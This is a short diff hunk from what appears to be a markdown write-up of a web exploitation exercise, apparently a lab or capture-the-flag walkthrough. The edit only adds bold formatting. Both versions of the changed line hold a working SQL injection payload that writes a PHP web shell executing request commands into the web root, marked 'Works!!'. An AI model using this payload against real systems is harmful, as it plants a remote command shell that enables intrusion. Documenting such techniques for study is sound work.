@@ -96,7 +96,7 @@ This users are my users...
 
 **RCE**
 
-Payload: ' union select "<?php system($_REQUEST['cmd']);?>" into outfile "/var/www/html/rce.php"-- -
+Payload: ' union select "**<?php system($_REQUEST['cmd']);?>**" into outfile "/var/www/html/rce.php"-- -
 
 **Works!!**
 
